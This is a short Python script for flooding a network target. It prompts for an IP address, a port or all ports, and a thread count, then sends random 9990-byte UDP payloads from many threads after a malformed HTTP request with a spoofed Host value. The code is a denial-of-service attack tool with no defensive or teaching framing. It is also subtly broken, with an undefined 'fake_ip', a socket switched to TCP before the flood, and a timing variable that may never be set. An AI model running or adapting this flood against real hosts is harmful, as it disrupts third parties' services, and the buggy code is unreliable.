import threading
import socket
import random
import time

    
ip=input("Enter the IP: ")
port=int(input("Enter the desired port or press -1 for all ports: "))
threads=int(input("Enter the number of threads: "))

#socket connection provides two nodes, one to listen on and the other to connect.AF_INET indicates ipv4 while SOCK_DGRAM indicates UDP connection.
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(9990)
global ttl1
ttl1=time.time()

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s.connect((ip,1))
    s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,1))
    s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,1))
except TimeoutError:
    global t1
    t1=time.time()

ttl = int(t1 - ttl1)

def slow(ip, port, thread):
    c=0
    while True:
        if port==int(-1):
            total= int(65534)
            for p in range(1,total):
                s.sendto(bytes, (ip,p))
                c=c+1
                print(f"Sent {c} packets to {ip} via thread {thread}")
                time.sleep(int(ttl-1))
        else:    
            s.sendto(bytes, (ip,port))
            c=c+1
            print(f"Sent {c} packets to {ip} via thread {thread}")
            time.sleep(int(ttl-1))


for thread in range(threads):
    threading.Thread(target=slow, args=(ip,port,thread)).start()
